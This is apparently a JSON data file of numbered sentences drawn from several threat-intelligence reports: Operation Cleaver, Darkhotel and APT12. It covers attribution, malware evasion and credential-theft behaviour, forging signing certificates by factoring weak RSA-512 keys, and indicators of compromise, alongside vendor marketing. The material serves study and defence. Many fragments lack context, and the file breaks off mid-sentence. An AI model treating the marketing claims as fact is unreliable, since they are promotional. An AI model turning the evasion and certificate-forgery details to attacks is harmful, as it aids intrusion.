severity of the impact .", "2104": "But they do n't need Stuxnet as motivation to want to hack the world .", "2105": "They have long desired power on the political stage , in particular in the fight for nuclear power autonomy .", "2106": "With the deadlines around the Iranian nuclear discussions pushed to 2015 , the attacks may be tied to negotiating power when discussing a pact with the nuclear superpowers of United States , Britain , France , Germany , Russia and China .", "2107": "The inner workings of the Iranian government remain largely a mystery to the western world .", "2108": "However , Iran 's control over its people and the private businesses birthed inside has been well reported .", "2109": "In a 2014 Reuters article , the reporters detail how the secret Iranian organization called '' Setad Ejraiye Farmane Hazrate Emam '' has become one of the most powerful organizations in the country , capable of taking over properties and businesses , buying controlling interests in numerous sectors including finance , oil , telecommunications and many others totaling in upwards of $ 95B .", "2110": "Even the US Treasury has documented an extensive fronting of companies in its report of Execution of Imam Khomeini 's Order ( EIKO ) , which through its two main subsidiaries controls 37 private businesses that are purely front companies for the Iranian government .", "2111": "The history of Iran controlling the usage of the Internet and the very Internet on-ramps into Iran is well known , .", "2112": "They have controlled much of the country 's Internet access to date and have taken over controlling interests in those companies to carry out their work .", "2113": "Given Operation Cleaver's frequent spin-up and take-down of large IP blocks inside the AFRANET IP space inside Iran , and Iran 's well recorded investment in cyber warfare leads us to one simple conclusion : Iran is extremely active in the world of hacking .", "2114": "Operation Cleaver 's intense focus on critical infrastructure companies , especially in South Korea , hints at information sharing or joint operations with Iran 's partner , North Korea .", "2115": "In September , 2012 , Iran signed an extensive agreement for technology cooperation agreement with North Korea , which allows for collaboration on a variety of efforts including IT and security .", "2116": "Operation Cleaver 's carefully selected targets like the oil and gas industry , energy and utility companies , as well as airlines and airports , indicates Iran 's desire to gain deep access into the world 's most critical environments .", "2117": "The end goal of this operation is not known at this time .", "2118": "University student recruitment was hinted at within Operation Cleaver and is consistent with Iran 's reported history of active warrior recruitment in the educational space .", "2119": "Overall , there are many reasons that Iran may be pursuing the targets they did in Operation Cleaver .", "2120": "While we may never truly know , it is important to consider all the above and more when trying to understand the why .", "2121": "After tracking the Operation Cleaver team for over two years , we 're led to the inexorable conclusion : the government of Iran , and particularly the Islamic Revolutionary Guard Corps ( IRGC ) , is backing numerous groups and front entities to attack the world 's critical infrastructure .", "2122": "As security experts in Critical Infrastructure and Key Resources ( CIKR ) , Industrial Control Systems ( ICS ) , Supervisory Control and Data Acquisition ( SCADA ) systems , Building Management Systems ( BMS ) , embedded systems and fixed-function systems , we know how easy they are to hack .", "2123": "We have worked with countless customers and vendors throughout the years to notify them of vulnerabilities , assist with remediatation efforts , and help mitigate threats to their environments .", "2124": "Unfortunately , many critical infrastructure organizations are unable to secure their complex envirnoments against modern attacks .", "2125": "They fall victim to the '' glue flu '' , a malaise of feeling stuck , not wanting to change the status quo for fear they will find problems that they have no idea how to prevent .", "2126": "This '' security anaphylaxis '' spells real disaster .", "2127": "If Operation Cleaver does n't get the world to wake up to what is happening in the silent world of cyber , then perhaps nothing will .", "2128": "Prevention is everything and we should never give up until it's achieved .", "2129": "Challenge your trusted advisors .", "2130": "Challenge your security vendors .", "2131": "Demand better technology and services to detect , respond , but most importantly PREVENT not just contemporary attacks , but future exotic attacks that have yet to be imagined .", "2132": "That is what truly disruptive and innovative technology is .", "2133": "Do n't settle for anything less .", "2134": "We hope that by exposing the Operation Cleaver team to the world , current global critical infrastructure victims can be notified , and prevent future victimization from suffering the consequences of '' status quo '' security .", "2135": "Unlike United Flight 811 , perhaps we can prevent the next disaster .", "2136": "DEFENDERS , NEVER GIVE UP ! In the face of growing and evolving threats , traditional cyber protection technologies are now widely considered inadequate .", "2137": "The only way to regain the upper hand against a new generation of attackers , is to embrace something entirely new .", "2138": "Something that '' thinks '' like an attacker .", "2139": "Something that does n't rely on a trust model or care about hash lookups .", "2140": "Something with a brain .", "2141": "Cylance has eschewed the old foundations that existing cybersecurity products are built upon .", "2142": "Instead , we 've based our approach on mathematics , machine learning , and data science .", "2143": "This algorithmic approach has been proven to detect \u2013 and stop \u2013 exponentially more modern threats .", "2144": "Leveraging algorithmic risk modeling , CylancePROTECT protects endpoints from everyday viruses , worms , trojans , and spyware , but unlike other security products , CylancePROTECT offers true future-proof protection against the most malicious threats in the world .", "2145": "Advanced Persistent Threats ( APT ) , 0-days , and exotic exploitation techniques are easily detected and halted with little-to-no impact on the end-user .", "2146": "Existing reactive solutions rely on a constant stream of signature updates for threat detection , which is not only costly and inconvenient , but also requires '' sacrificial lambs '' .", "2147": "Only after a previously unseen threat has inflicted damage can the rest of the industry begin to detect it .", "2148": "CylancePROTECT does n't require constant updates or even a network connection to protect against so-called '' previously undetectable '' threats .", "2149": "By identifying and defusing attacks in near real time , before the attack can execute , we can finally do away with the need for a '' patient zero '' .", "2150": "As Richard Stiennon , Chief Research Analyst at IT-Harvest , put it , '' Many vendors are trying to solve the endpoint problem , yet Cylance is the only one using the power of math to stop malware and with more effectiveness and efficiency than current solutions '' .", "2151": "Interested in seeing what CylancePROTECT can do for your organization ? Contact us ! Cylance is one of the fastest growing cybersecurity technology firms in the US .", "2152": "Cylance 's flagship product CylancePROTECT has been adopted by Fortune 500 companies and government agencies across the globe .", "2153": "Cylance was founded by 27-year security industry luminary , Stuart McClure , former Global CTO of McAfee , original founder of Foundstone , and lead author of the international best-selling book Hacking Exposed .", "2154": "In building Cylance , Stuart brought together the best scientific and executive minds from the likes of Cisco , Sourcefire , Google and McAfee .", "2155": "The Cylance board of advisors includes former high-ranking officials from the DHS , the FBI , CIA , and executive titans of business .", "2156": "CylancePROTECT is the only next generation endpoint security product that applies math to mute existing and future malware , viruses , worms , trojans , bots , APTs , 0-days , exploits , adware , spyware and hacking tools \u2013 without needing any updates or even a connection to the Internet .", "2157": "The technology is founded on the principle that to fix the industry , you must start from scratch with a way as yet unseen .", "2158": "CylancePROTECT does not rely on signatures of any sort ( blacklist or whitelist ) , behavioral analysis using IOCs , sandboxing analysis , heuristics , micro-virtualization , or dynamic detonation \u2013 to detect and prevent malicious files from executing on a target endpoint .", "2159": "While every other endpoint security product must collect a sample , analyze , and write a signature to detect it , CylancePROTECT can detect malware before it executes by statically analyzing features found in the binary itself .", "2160": "Features and Benefits of CylancePROTECT : \u2022 Near real time detection of malicious files , even if they 've never been seen in the wild .", "2161": "\u2022 Can be used to augment existing endpoint security or be deployed as a complete replacement .", "2162": "\u2022 Does not require any signature updates or connection to the cloud .", "2163": "\u2022 An easy-to-use web management console with intuitive workflows .", "2164": "\u2022 Low-impact endpoint agent .", "2165": "For a demo of CylancePROTECT , contact a Cylance expert today ! Cylance 's Professional Services team is available to assist companies affected by this campaign .", "2166": "Cylance is providing consulting to companies that may have been targeted by these advanced threat actors .", "2167": "Cylance will perform initial triage in order to determine the extent to which your company has been affected by this campaign and work towards establishing a containment strategy .", "2168": "Cylance has two tailored offerings for clients affected by this campaign .", "2169": "The first one includes ICS in our incident response since many companies affected are in the Critical Infrastructure and Key Resources ( CIKR ) vertical .", "2170": "The second offering 's focus is to deploy our proprietary tools and methodologies to detect and mitigate the threats posed by Operation Cleaver .", "2171": "For more information on how the Cylance Professional Services team can assess and respond to attacks like the ones obseved in Operation Cleaver , contact sales @ cylance.com today .", "2172": "Brian is a Sr. Security Researcher for Cylance who joined shortly after the company was established .", "2173": "He is best known for his avid botnet research ( often going by '' botnethunter '' ) and for his novel malware analysis in the A Study in Bots blog series hosted by Cylance .", "2174": "Brian has been a dedicated open-source developer as well as an advocate for public and private anti-botnet operations .", "2175": "Brian actively develops techniques to combat cyber oppositions in positions where resources and leverage are in too limited of supply for conventional means .", "2176": "These techniques , cultivated by Stuart McClure , are the Art of Deterrence .", "2177": "In a previous investigation , Art of Deterrence techniques were successfully used to divert Indonesian hackers motivated by monetary gain away from their highest yielding target group .", "2178": "Brian 's botnet research covers a wide range of topics , from using graph analysis to estimate the amount of ransom that has been paid to a ransomware operator , to utilizing IPv4 scanning techniques to identify and take down point of sale malware panels .", "2179": "Stuart is founder , CEO/President and Chairman of Cylance .", "2180": "Widely recognized for his extensive and in-depth knowledge of security products , Stuart McClure is considered one of the industry 's leading authorities in information security today .", "2181": "A well-published and acclaimed security visionary with currently eleven books in print , McClure is the originating founder of the Hacking Exposed series of books , the most successful security book ever written .", "2182": "From his work , he founded Foundstone in October of 1999 which sold to McAfee in 2004 .", "2183": "McClure brings over two decades of technology and executive leadership with profound technical , operational , and financial experience .", "2184": "Besides Foundstone , Stuart held leadership positions at InfoWorld , Ernst & Young , Kaiser Permanente and a number of government agencies .", "2185": "At McAfee , McClure held numerous positions including SVP/General Manager for the Security Management BU as well as EVP/Global Chief Technology Officer responsible for almost $ 3B worth of revenues .", "2186": "Today , McClure is CEO of Cylance , a disruptive and innovative startup applying math to the problem of security .", "2187": "Cylance products such as CylancePROTECT prevent the most advanced attacks in the world without signatures or sandboxing in realtime on the endpoint .", "2188": "Cylance Services offer highly specialized security services such as incident response , forensics , compromise assessments and advanced penetration assessments for global critical infrastructure .", "2189": "Cylance employees work passionately and tirelessly every day to achieve one goal : Protect the world from cyber attacks .", "2190": "And with their efforts in tracking Operation Cleaver , they have achieved that goal .", "2191": "Our endless thanks to all the Cylancers who contributed to this report .", "2192": "The Operation Cleaver logo , created by Cylance specifically for this report , was inspired by the infamous logo used by the Army of the Guardians of the Islamic Revolution , also known in the west as the Iranian Revolutionary Guard Corps ( IRGC ) .", "2193": "Due to the close connection between the members tracked in this report and the IRGC , it was only fitting to replicate the look and feel of the IRGC 's iconography as the anchor for this document 's branding .", "2194": "The striking visual elements that make up the logo of the IRGC have very specific meanings : \u2022 The clenched fist holding a rifle , most likely an AK-47 , represents armed resistance .", "2195": "\u2022 The globe symbolizes the IRGC 's worldwide ambitions .", "2196": "\u2022 The book , from which the clenched first emanates , represents the Qur'an , connecting the religious ideals on which the group was founded to the armed struggle .", "2197": "\u2022 The plants , possibly wheat , represent prosperity .", "2198": "\u2022 The name of the group in Persian , the year in which it was founded and a passage from the Qur'an ( 8:60 ) 'And make ready against them all you can of power ' , are represented in text .", "2199": "Several of the visual elements present in the IRGC logo have been carried over to the Operation Cleaver logo including : \u2022 A clenched fist , this time holding a cleaver , represents the group 's likely connection with the IRGC as well as armed resistence in general .", "2200": "\u2022 The globe in the background represents Operation Cleaver 's worldwide reach .", "2201": "\u2022 An ethernet cable connected to the clenched first represents the nature of these attacks ( cyber as opposed to traditional warfare ) .", "2202": "\u2022 The hex string translates to '' Think Evil , Do Good '' , a mantra our research team lives by .", "2203": "This Appendix details the IOCs discovered in the investigation of Operation Cleaver .", "2204": "CylancePROTECT prevents the malware used in Operation Cleaver from ever executing .", "2205": "These mutexes are used with the process ID of the malware as a suffix : Listed below are both the MD5 and SHA-256 hashes for samples related to Operation Cleaver .", "2206": "If it exists the module exits , if not \u00adthe module creates one .", "2207": "After that it compiles a string describing the system in the following format : \u00ab C P U : % CPUNAME % < br > Net card : % IP % ( % MACADDR % ) < br > \u00bb .", "2208": "Next it checks if this string contains one of the following substrings : If any of these strings is found , the module terminates .", "2209": "After that , there is a hardcoded value of 10 , which delays further execution of the module for 10 seconds .", "2210": "If not , the module proceeds with network communication routine .", "2211": "But if this file is found it does some additional checks .", "2212": "After all , if the module is ready and allowed to communicate with C & C server it does that in the following manner .", "2213": "1 .", "2214": "The malware locates \u00abDEXT87\u00bb and reads the data appended to it .", "2215": "The appended data should be an IP address in plaintext .", "2216": "This is used a real C & C IP address .", "2217": "Reading stops when non\u00addigit or dot symbol is found .", "2218": "Here is an example of shortest possible valid server response : 2 .", "2219": "Upon successful receiving of the file it is started in a new process .", "2220": "This module is designed not to run on Windows with system default codepage set to Korean .", "2221": "Bdagent.exe is a name for BitDefender Antivirus component .", "2222": "Pushing ESC key closes the modal message box .", "2223": "There is one interesting specifics in Microsoft IntelliForms which reveals attack- er 's interests .", "2224": "IntelliForms technology keeps login/password information in the registry in encrypted form .", "2225": "However , there is no clear information about the corre- sponding website which requires given login and password .", "2226": "The only information Intelliforms offers about the place where given login/password should be used is a hash of the webpage URL .", "2227": "They have implemented this logics in the malware .", "2228": "String encryption/decryption functions use the following keys : The module works with all Firefox versions prior to Mozilla Firefox 12.0 .", "2229": "Depend- ing on version of Firefox , it can read Firefox database directly to dump stored se- crets or utilize one Firefox libraries to access the configuration data .", "2230": "The module is linked with SQLite version 3.7.5 release candidate 2 , release hash ed759d5a9edb3bba5f48f243df47be29e3fe8cd7 dated as 2011\u00ad01\u00ad28 17:03:50 .", "2231": "domain used in malware .", "2232": "This top level country code domain is quite exotic and is assigned to Pitcairn Islands , which is Overseas ter- ritory of the United Kingdom in the Pacific .", "2233": "As of 2013 estimated population of Pitcairn Islands is only 56 people .", "2234": "An official .pn", "2235": "domain costs $ 100/year from the registry , however .eu.pn", "2236": "domains seem to be given away for free .", "2237": "\u00abuser2\u00bb in current sample ) \u037e < UniqueMachineId > is a 32 characters long hex string which derived from net- work card MAC address\u037e < EncryptionKey > is symmetrical encryption key used to encrypt < UserId > and < GeneralSysInfo > values .", "2238": "The malware uses text protocol , which is why potentially binary values of < UserId > and < GeneralSysInfo > are ad- ditionally encoded using Base64 algorithm .", "2239": "< GeneralSysInfo > field contains only basic information about the system , i.e .", "2240": "\u00abMinmei\u00bb may be a reference to a popular Japanese anime and manga known as \u00abThe Super Dimension Fortress Macross\u00bb .", "2241": "If yes it does additional port I/O specific to VMWare virtual machine ( the VMware hypervisor port : 0x5658\u037e VMware hypervisor magic value : 0x564D5868 ) .", "2242": "If it belongs to subnet 192.168.100 .", "2243": "* then the malware believes it 's running in a VM .", "2244": "This string varies depending on the local system language and may be one of the following : % HOSTID % is a special value generated from local network card MAC address\u037e % SYSINFO % is a string with general system information ( please see description above ) \u037e % AVSOFTID % is a string that contains indexes of AV software names in internal table of AV Identifiers ( please see the table above ) .", "2245": "A large number of files are detected by Kaspersky Lab scanners as Virus.Win32 .", "2246": "Pioneer.dx .", "2247": "This malware is 63kb in size .", "2248": "It is bound to a variety of other software packages that vary in name , but the host package is consistently detected as '' Virus.Win32 .", "2249": "Pioneer.dx '' .", "2250": "Win32.Agent.xwge ) from its .data", "2251": "section in memory with a simple xor 0xbb .", "2252": "It then resumes the thread in the new process .", "2253": "It is signed with the familiar '' '' digital certificate .", "2254": "Here we see the local port variables assigned values And here , the ports are directly being read with READPORTUCHAR ( 0x64 ) and then READPORTUCHAR ( 0x60 ) : It buffers , then communicates the data to the running user mode component .", "2255": "Here is debug output demonstrating this component 's data retrieval when the letter '' D '' is repeatedly pressed on the keyboard .", "2256": "Keyscan make and break codes are '' 0x20 '' and '' 0xA0 '' and for the key press and key release for the '' D '' key .", "2257": "The '' 0x1D '' value from port 0x64 that you see below is basically an indication that the output buffer is full and the keyboard is locked , so it is safe for the driver to access the key value in port 0x60 : These debug messages and code style are duplicates of what chpie posted in the past .", "2258": "Its encryption algorithm is similar to RC4 .", "2259": "Interesting part is that the module randomly generates the key and stores it in an unexpected place : in the middle of the log file name .", "2260": "Hence , the numeric part of the filename is used as a seed for the pseudorandom number generator .", "2261": "Rand function is statically linked to insure same results on different computers .", "2262": "Here is the commented RC4 encryption code :", "2263": "The Darkhotel APT is a threat actor possessing a seemingly inconsistent and con- tradictory set of characteristics , some advanced and some fairly rudimentary .", "2264": "In- hospitably operating for almost a decade , the threat actor is currently active .", "2265": "Darkhotel tools are detected as '' Tapaoux '' , '' Pioneer '' , '' Karba '' , and '' Nemim '' , among other names .", "2266": "These might be GoogleToolbar , Adobe Flash , Windows Messenger , etc .", "2267": "This group of attackers seems to know in advance when these individuals will arrive and depart from their high-end hotels .", "2268": "So , the attackers lay in wait until these travelers arrive and connect to the Internet .", "2269": "The FBI issued advisories about similar hotel incidents ; Australian government offi- cials produced similar , newsworthy accounts when they were infected .", "2270": "While an FBI announcement related to attacks on hotel guests overseas appeared in May 2012 , related Darkhotel samples were already circulating back in 2007 .", "2271": "And available Darkhotel server log data records connections as early as Jan 1 , 2009 .", "2272": "When visiting the same hotels , our honeypot research systems could n't attract a Darkhotel attack .", "2273": "This data is inconclusive , but it points to misuse of check-in information .", "2274": "The Darkhotel actor maintained an effective intrusion set at hotel networks , providing ample access to unexpected points of attack over several years .", "2275": "These staging points also provide the attackers with access to check-in/check-out and identity information of visitors to high-end and luxury hotels .", "2276": "The attackers were very careful with the placement of these iframes and executables on trusted resources - the hotels ' network login portals themselves .", "2277": "Those portals are now reviewed , cleaned and undergoing a further review and hardening process .", "2278": "We observed traces of a couple of these incidents in late 2013 and early 2014 on a victim hotel 's network .", "2279": "Outside reports of the same activity at other hotels provide enough data to confirm the same careful operations there .", "2280": "The attack technique blurs the line between a couple of common APT tactics ; fairly inaccurate '' watering holes '' or '' strategic web compromises '' and more accurate spearphishing techniques .", "2281": "In this case , the Darkhotel attackers wait for their victim to connect to the Internet over the hotel Wi-Fi or the cable in their room .", "2282": "There is a very strong likelihood the targets will connect over these resourc- es , and the attackers rely on that likelihood , much like at a watering hole .", "2283": "While setting up the attack , the Darkhotel attackers knew the target 's expected arrival and departure times , room number , and full name , among other data .", "2284": "So , here we have yet another unique characteristic of this attacker - they employ a loosely certain but highly precise offensive approach .", "2285": "These Japanese archives , translated for Chinese speaking viewers , appear to be sexual in nature , part of an anime sex/military comic scene , exposing the likely interests of potential targets .", "2286": "The p2p bittorrent Darkhotel offering is listed here , posted on 2013.11.22 .", "2287": "It was spread throughout 2014 .", "2288": "This torrent serves up an almost 900 mb file .", "2289": "The rar archive decompresses to a directory full of encrypted zips , the associated decryptor and a password file for decrypting the zips .", "2290": "There are tens of thousands of down- loads of these individual torrents .", "2291": "Examples include comics and anime offerings .", "2292": "These subproject efforts targeted defense industrial base ( DIB ) , government , and NGO organizations .", "2293": "Email content on topics like nuclear energy and weaponry capabilities was used as a lure .", "2294": "Early accounts were posted on contagio describing attacks on NGO organi- zations and government policy makers .", "2295": "This crew occasionally deploys 0-day exploits , but burns them when required .", "2296": "In early 2014 , our researchers exposed their use of cve\u00ad2014\u00ad0497 , a Flash 0-day described on Securelist in early February .", "2297": "The Darkhotel actors typically sign their backdoors with digital certificates of one kind or another .", "2298": "However , the certificates originally chosen by this crew are very interesting because of their weak keys and likely abuse by attackers .", "2299": "Here is a listing of the certs that were commonly used to sign Darkhotel malcode , requiring advanced mathematical capabilities to factorize the keys at the time .", "2300": "They are not the only certificates used by the group .", "2301": "More recent activity suggests that the group has stolen certificates to sign their code .", "2302": "All related cases of signed Darkhotel malware share the same Root Certificate Authority and Intermediate Certificate Authority that issued certificates with weak md5 keys ( RSA 512 bits ) .", "2303": "We are confident that our Darkhotel threat actor fraudulently duplicated these certificates to sign its malware .", "2304": "These keys were not stolen .", "2305": "Many of the certificates were noted in a 2011 Fox\u00adIT post '' RSA\u00ad512 Certificates Abused in the Wild '' .", "2306": "To further support this speculation please note the non\u00adspecific Microsoft Security Advisory below , the Mozilla advisory addressing the issue at the time , and the Entrust responses .", "2307": "From Microsoft 's security advisory from Thursday , November 10 , 2011 : '' Microsoft is aware that DigiCert Sdn .", "2308": "Bhd , a Malaysian subordinate certifica- tion authority ( CA ) under Entrust and GTE CyberTrust , has issued 22 certifi- cates with weak 512 bit keys .", "2309": "While this is not a vulnerability in a Microsoft product , this issue affects all supported releases of Microsoft Windows .", "2310": "There is no indication that any certificates were issued fraudulently .", "2311": "Instead , cryptographically weak keys have allowed some of the certificates to be dupli- cated and used in a fraudulent manner .", "2312": "Microsoft is providing an update for all supported releases of Microsoft Windows that revokes the trust in DigiCert Sdn .", "2313": "Bhd .", "2314": "The update revokes the trust of the following two intermediate CA certificates : Digisign Server ID \u2013 ( Enrich ) , issued by Entrust.net Certification Authority ( 2048 ) Digisign Server ID ( Enrich ) , issued by GTE CyberTrust Global Root '' From Mozilla 's 2011 response : '' While there is no indication they were issued fraudulently , the weak keys have allowed the certificates to be compromised .", "2315": "Furthermore , certificates from this CA contain several technical issues .", "2316": "They lack an EKU extension specifying their intended usage and they have been issued without revocation information .", "2317": "'' From Entrust 's response : '' There is no evidence that the Digicert Malaysia certificate authorities have been compromised .", "2318": "'' Here are some notes on the costs and technical requirements of attacking these certificates .", "2319": "The computing power required to crack and factor an RSA 512 bit key was $ 5000 and the period of time required was about 2 weeks .", "2320": "( see http : //lukenotricks .", "2321": "blogspot.co.at/2010/03/rsa\u00ad512\u00adfactoring\u00adservice\u00adtwo\u00adweeks.html ) In October 2012 , Tom Ritter reported that it would cost about $ 120\u00ad- $ 150 , per- haps even as little as $ 75 .", "2322": "Going even further back , there was much discussion about the technical meth- ods of cracking these keys : DJ Bernstein 's 2001 paper on building a machine reducing the cost of integer factorization with Number Field Sieve techniques , breaking 1024 bit RSA keys .", "2323": "RSA 's reaction and 2002 statement on whether or not 1024 bit RSA keys are broken : '' NIST offered a table of proposed key sizes for discussion at its key man- agement workshop in November 2001 [ 7 ] .", "2324": "For data that needs to be protected no later than the year 2015 , the table indicates that the RSA key size should be at least 1024 bits .", "2325": "For data that needs to be protected longer , the key size should be at least 2048 bits .", "2326": "'' Recent Tapaoux attacks and backdoors include malware signed with strong SHA1/RSA 2048 bit certificates , suggesting certificate theft .", "2327": "It is clean , well\u00adwritten , kernel level malcode .", "2328": "The languages of its strings are a mix of English and Korean .", "2329": "It is signed with the familiar '' belinda.jablonski @ syniverse.com '' digital certificate .", "2330": "It buffers , then communicates logged user data to the running user mode component .", "2331": "Its encryption algorithm is similar to RC4 .", "2332": "The interesting part is that the module randomly generates the key and stores it in an unexpected place : in the middle of the log file name .", "2333": "Hence , the numeric part of the filename is used as a seed for the pseudorandom number generator .", "2334": "The rand function is statically linked to ensure same results on different computers .", "2335": "The Darkhotel toolset consists of multiple components that have been slightly modified over time .", "2336": "If a special file exists on the system , the module will not start calling back to C & C server until the special file is 180 days old .", "2337": "This malware is 220Kb in size .", "2338": "More technical details are provided in Appendix D. This malware is 63kb in size .", "2339": "Pioneer.dx '' .", "2340": "Observed downloaded components are signed with a familiar expired certificate from www.esupplychain.com.tw , issued by Cybertrust SureServer CA .", "2341": "Some IDs appear to be related to geographic interests , others do not seem obvious .", "2342": "We gathered a list of Darkhotel campaign IDs shown below .", "2343": "Internal IDs and c2 resources overlap across these com- ponents , there is no pattern of distribution according to connectback resources .", "2344": "The most common id is '' DEXT87 '' : This infrastructure team appears to employ a lesser skillset than top notch campaigns , maintaining weak server configurations with limited monitoring and defensive reactions , and making some simple mistakes .", "2345": "However , they are ef- fective at maintaining a fully available infrastructure to support new and existing infections .", "2346": "Overall , victims in our sinkhole logs and KSN data were found across the globe , with the majority in Japan , Taiwan , China , Russia , Korea and Hong Kong .", "2347": "The following C & C domains have been sinkholed and redirected to the Kaspersky Sinkhole Server Our Kaspersky Security Network detected Darkhotel infections across thousands of machines , mostly related to the Darkhotel p2p campaigns .", "2348": "These geolocation estimates probably provide the most accurate picture of where Darkhotel activity is occurring .", "2349": "Here is a pie chart to better visualize the proportions of attack activity throughout the world .", "2350": "As you can see , over 90 % of it occurs in the top five countries : Japan , followed by Taiwan , China , Russia and Korea .", "2351": "Also , many researcher systems are connected to the sinkholed domains .", "2352": "However , this graph of current sinkhole callbacks presents a low confidence distribution of victim geolocation , with India , Japan , Ireland , Korea , China and Taiwan in the top slots .", "2353": "Removing India and Ireland , the set more closely matches our KSN data .", "2354": "The ddrlogs appear to maintain callback data that the attackers want to set aside in error logs .", "2355": "Many of the callback URLs have errors , many are from unwanted IP ranges , and others are clearly unwanted researcher sandbox system callbacks .", "2356": "Those records are formatted in the following manner : Only 120 IP addresses perform the '' B '' checkin , and 90 % of these are from the range 150.70.97.x .", "2357": "This entire range is owned by Trend Micro in Tokyo , JP .", "2358": "A handful of the remaining addresses , like 222.150.70.228 , appear to come from other ranges owned by Trend Micro in JP .", "2359": "One outlier comes from an El Sal- vadoran ISP , and another is connected to a Japanese ISP .", "2360": "Approximately 20,000 IP addresses perform the '' L '' checkin .", "2361": "Other ddrlogs may include '' A '' tags as well .", "2362": "The '' A '' tag labels unwanted checkins from untargeted locations , like Hungary and Italy .", "2363": "The '' B '' tag labels unwanted checkins from Trend Micro IP ranges .", "2364": "The '' L '' tag labels unwanted checkins from a variety of ranges , but includes odd IP like the loopback address , 127.0.0.1 , clearly an error .", "2365": "Entries in these logs include callback URLs that have spaces and unusual charac- ters that do not conform to the required base64 character dictionary .", "2366": "When an unauthorized user attempts to access a Darkhotel web interface for victim management without the correct passkey , the html page and table layout renders properly , but all the data values on the page are returned as garbled ciphertext .", "2367": "Collected data probably is presented in order of importance : Here is an example of one of these web pages : Clearly , some automated analysis activity involving researchers ' sandbox tools are filling up these logs .", "2368": "From June 2013 to April 2014 ( approximately an 11 month period ) , in only 15 ddrlog files , we observe almost 7,000 connections from research sandbox systems .", "2369": "The network connections provide a1= through a3= values identifying a QEMU based sandbox , all sourced from only 485 WAN IP ad- dresses .", "2370": "Under 30 lan IPs are recorded , all in the same 172.16.2.14\u00ad126 range .", "2371": "This system ( s ) uses a '' Dave '' user account and '' HOME\u00adOFF\u00adD5F0AC '' Windows system name .", "2372": "These characteristics correspond with network activity generated by GFI Soft- ware 's '' CWsandbox '' tools , now owned by '' ThreatTrack Security '' .", "2373": "For the past seven years , a strong threat actor named Darkhotel , also known as Tapaoux , has carried out a number of successful attacks against a wide range of victims from around the world .", "2374": "It employs methods and techniques which go well beyond typical cybercriminal behavior .", "2375": "The Darkhotel crew 's skillset allows it to launch interesting cryptographical at- tacks , for instance factoring 512 bit RSA keys .", "2376": "Its use of 0-days is another indica- tor of a strong threat actor .", "2377": "The targeting of top executives from various large companies around the world during their stay at certain '' Dark Hotels '' is one of the most interesting aspects of this operation .", "2378": "The exact method of targeting is still unknown - for instance , why some people are targeted while others are not .", "2379": "The fact that most of the time the victims are top executives indicates the attackers have knowledge of their victims whereabouts , including name and place of stay .", "2380": "This paints a dark , dangerous web in which unsuspecting travelers can easily fall .", "2381": "While the exact reason why some hotels function as an attacker vector are unknown , certain suspicions ex- ist , indicating possibly a much larger compromise .", "2382": "We are still investigating this aspect of the operation and will publish more information in the future .", "2383": "A further interesting trait is the deployment of multiple types of campaigns , both targeted and botnet .", "2384": "We expect the Darkhotel crew to continue their activities against DIB , Govern- ment and NGO sectors .", "2385": "The appendix released with this paper provides technical indicators of compromise which should help victims identify the malicious traffic and enable targets to protect themselves better against attack .", "2386": "The attackers referred to as APT12 ( also known as IXESHE , DynCalc , and DNSCALC ) recently started a new campaign targeting organizations in Japan and Taiwan .", "2387": "APT12 is believed to be a cyber espionage group thought to have links to the Chinese People 's Liberation Army .", "2388": "APT12\u2032s targets are consistent with larger People 's Republic of China ( PRC ) goals .", "2389": "Intrusions and campaigns conducted by this group are in- line with PRC goals and self - interest in Taiwan .", "2390": "Additionally , the new campaigns we uncovered further highlight the correlation between APT groups ceasing and retooling operations after media exposure , as APT12 used the same strategy after compromising the New York Times in Oct 2012 .", "2391": "Much like Darwin 's theory of biological evolution , APT12 been forced to evolve and adapt in order to maintain its mission .", "2392": "The new campaign marks the first APT12 activity publicly reported since Arbor Networks released their blog \" Illuminating The Etumbot APT Backdoor . \" FireEye refers to the Etumbot backdoor as RIPTIDE .", "2393": "Since the release of the Arbor blog post , FireEye has observed APT12 use a modified RIPTIDE backdoor that we call HIGHTIDE .", "2394": "This is the second time FireEye has discovered APT12 retooling after a public disclosure .", "2395": "As such , FireEye believes this to be a common theme for this APT group , as APT12 will continue to evolve in an effort to avoid detection and continue its cyber operations .", "2396": "FireEye researchers also discovered two possibly related campaigns utilizing two other backdoors known as THREEBYTE and WATERSPOUT .", "2397": "These documents were also emailed to organizations in Japan and Taiwan .", "2398": "While APT12 has previously used THREEBYTE , it is unclear if APT12 was responsible for the recently discovered campaign utilizing THREEBYTE .", "2399": "Similarly , WATERSPOUT is a newly discovered backdoor and the threat actors behind the campaign have not been positively identified .", "2400": "However , the WATERSPOUT campaign shared several traits with the RIPTIDE and HIGHTIDE campaign that we have attributed to APT12 .", "2401": "RIPTIDE 's first communication with its C2 server fetches an encryption key , and the RC4 encryption key is used to encrypt all further communication .", "2402": "In June 2014 , Arbor Networks published an article describing the RIPTIDE backdoor and its C2 infrastructure in great depth .", "2403": "The blog highlighted that the backdoor was utilized in campaigns from March 2011 till May 2014 .", "2404": "Following the release of the article , FireEye observed a distinct change in RIPTIDE 's protocols and strings .", "2405": "The changes to RIPTIDE were significant enough to circumvent existing RIPTIDE detection rules .", "2406": "FireEye dubbed this new malware family HIGHTIDE .", "2407": "Attached to this email was a malicious Microsoft Word document ( MD5 : f6fafb7c30b1114befc93f39d0698560 ) that exploited CVE-2012 - 0158 .", "2408": "It is worth noting that this email appeared to have been sent from another Taiwanese Government employee , implying that the email was sent from a valid but compromised account .", "2409": "The HIGHTIDE backdoor connected directly to 141.108.2.157 .", "2410": "If you compare the HTTP GET request from the RIPTIDE samples ( Figure 1 ) to the HTTP GET request from the HIGHTIDE samples ( Figure 3 ) you can see the malware author changed the following items .", "2411": "User Agent Format and structure of the HTTP Uniform Resource Identifier ( URI ) Similar to RIPTIDE campaigns , APT12 infects target systems with HIGHTIDE using a Microsoft Word ( .doc ) document that exploits CVE-2012 - 0158 .", "2412": "RIPTIDE and HIGHTIDE differ on several points : executable file location , image base address , the User- Agent within the GET requests , and the format of the URI .", "2413": "All but one sample that we identified were written to this folder as word.exe .", "2414": "The one outlier was written as winword.exe .", "2415": "Research into this HIGHTIDE campaign revealed APT12 targeted multiple Taiwanese Government organizations between August 22 and 28 .", "2416": "The MD5 of the exploit document was e009b95ff7b69cbbebc538b2c5728b11 .", "2417": "This backdoor had the following properties .", "2418": "This backdoor sent the following callback traffic to video[.]csmcpr[.]com .", "2419": "The THREEBYTE spear phishing incident ( while not yet attributed ) shared the following characteristics with the above HIGHTIDE campaign attributed to APT12 .", "2420": "The backdoor had the following properties .", "2421": "The backdoor connects to a command and control server at 